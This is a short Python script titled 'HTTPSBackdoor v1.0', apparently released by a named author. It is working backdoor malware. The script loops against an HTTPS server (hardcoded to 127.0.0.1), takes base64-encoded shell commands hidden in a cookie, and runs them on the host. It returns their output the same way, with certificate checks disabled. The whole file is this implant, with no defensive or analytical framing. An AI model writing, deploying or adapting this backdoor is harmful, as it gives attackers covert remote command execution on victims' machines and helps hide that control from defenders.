# Name: HTTPSBackdoor v1.0
# Created By: Sayan Ray [@BareBones90]

import warnings
import logging
from requests import *
from subprocess import getoutput

from base64 import b64encode, b64decode

warnings.filterwarnings("ignore")

while True:
	try:
		initialResp = get("https://127.0.0.1/message", verify = False)
		cmd = b64decode(initialResp.cookies["userId"].encode()).decode()
		out = b64encode(getoutput(cmd).encode()).decode()
		finalResp = get("https://127.0.0.1/message", cookies = {
			"userId" : out
			}, verify = False)
	except Exception as e:
		print(e)
		break